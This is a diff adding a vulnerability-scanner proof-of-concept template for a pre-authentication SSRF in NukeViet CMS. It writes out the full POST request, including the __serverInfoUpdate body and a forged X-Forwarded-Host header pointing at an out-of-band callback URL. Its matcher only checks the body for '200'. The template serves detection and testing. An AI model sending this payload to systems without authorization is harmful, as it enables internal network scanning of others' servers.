@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "检测 NukeViet CMS 预认证服务端请求伪造漏洞。通过 POST 请求携带 __serverInfoUpdate=1 及伪造的 X-Forwarded-Host/X-Forwarded-Proto 请求头，触发 includes/ini.php 中 server_info_update() 函数的未经验证 cURL 调用，实现内网主机与端口扫描。盲 SSRF 需 OOB 方式确认。"
+id = "POC-AVE-2026-0596"
+name = "NukeViet Pre-authentication SSRF via X-Forwarded-Host PoC"
+severity = "high"
+tags = [
+    "cve-2026-55372",
+    "ssrf",
+    "nukeviet",
+]
+vuln_id = [
+    "CVE-2026-55372",
+    "AVE-2026-0596",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "__serverInfoUpdate=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+X-Forwarded-Host = "{{interactsh-url}}"
+X-Forwarded-Proto = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["200"]
